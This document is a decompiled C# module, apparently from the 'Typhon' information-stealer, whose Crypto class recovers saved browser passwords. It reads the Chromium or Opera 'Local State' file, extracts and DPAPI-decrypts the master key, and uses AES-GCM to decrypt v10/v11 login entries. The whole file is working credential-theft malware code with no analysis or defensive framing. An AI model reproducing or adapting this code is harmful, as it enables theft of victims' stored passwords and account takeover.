using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Typhon.Modules.Miscellaneous
{
	// Token: 0x02000035 RID: 53
	internal class Crypto
	{
		// Token: 0x060000D7 RID: 215
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Crypto.DataBlob pCipherText, ref string pszDescription, ref Crypto.DataBlob pEntropy, IntPtr pReserved, ref Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Crypto.DataBlob pPlainText);

		// Token: 0x060000D8 RID: 216 RVA: 0x00008758 File Offset: 0x00006958
		public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
		{
			Crypto.DataBlob dataBlob = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob2 = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob3 = default(Crypto.DataBlob);
			Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Crypto.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Crypto.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (bCipher == null)
					{
						bCipher = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
					dataBlob2.cbData = bCipher.Length;
					Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
				}
				catch
				{
				}
				try
				{
					if (bEntropy == null)
					{
						bEntropy = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
					dataBlob3.cbData = bEntropy.Length;
					Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
				}
				catch
				{
				}
				Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x0000890C File Offset: 0x00006B0C
		public static byte[] GetMasterKey(string sLocalStateFolder)
		{
			string text;
			if (sLocalStateFolder.Contains("Opera"))
			{
				text = sLocalStateFolder + "\\Opera Stable\\Local State";
			}
			else
			{
				text = sLocalStateFolder + "\\Local State";
			}
			byte[] array = new byte[0];
			if (!File.Exists(text))
			{
				return null;
			}
			if (text != Crypto.sPrevBrowserPath)
			{
				Crypto.sPrevBrowserPath = text;
				foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text)))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				byte[] result;
				try
				{
					Crypto.sPrevMasterKey = Crypto.DPAPIDecrypt(array2, null);
					result = Crypto.sPrevMasterKey;
				}
				catch
				{
					result = null;
				}
				return result;
			}
			return Crypto.sPrevMasterKey;
		}

		// Token: 0x060000DA RID: 218 RVA: 0x00008A2C File Offset: 0x00006C2C
		public static string GetUTF8(string sNonUtf8)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = sNonUtf8;
			}
			return result;
		}

		// Token: 0x060000DB RID: 219 RVA: 0x00008A6C File Offset: 0x00006C6C
		public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
		{
			byte[] array = new byte[12];
			Array.Copy(bEncryptedData, 3, array, 0, 12);
			byte[] result;
			try
			{
				byte[] array2 = new byte[bEncryptedData.Length - 15];
				Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				result = new AesGcm().Decrypt(bMasterKey, array, null, array4, array3);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		// Token: 0x060000DC RID: 220 RVA: 0x00008B0C File Offset: 0x00006D0C
		public static string EasyDecrypt(string sLoginData, string sPassword)
		{
			if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
			{
				byte[] masterKey = Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
				return Encoding.Default.GetString(Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
			}
			return Encoding.Default.GetString(Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
		}

		// Token: 0x060000DD RID: 221 RVA: 0x00008B80 File Offset: 0x00006D80
		public static string BrowserPathToAppName(string sLoginData)
		{
			if (sLoginData.Contains("Opera"))
			{
				return "Opera";
			}
			sLoginData.Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "");
			return sLoginData.Split(new char[]
			{
				'\\'
			})[1];
		}

		// Token: 0x0400007B RID: 123
		private static string sPrevBrowserPath = "";

		// Token: 0x0400007C RID: 124
		private static byte[] sPrevMasterKey = new byte[0];

		// Token: 0x02000036 RID: 54
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x0400007D RID: 125
			public int cbSize;

			// Token: 0x0400007E RID: 126
			public int dwPromptFlags;

			// Token: 0x0400007F RID: 127
			public IntPtr hwndApp;

			// Token: 0x04000080 RID: 128
			public string szPrompt;
		}

		// Token: 0x02000037 RID: 55
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000081 RID: 129
			public int cbData;

			// Token: 0x04000082 RID: 130
			public IntPtr pbData;
		}
	}
}
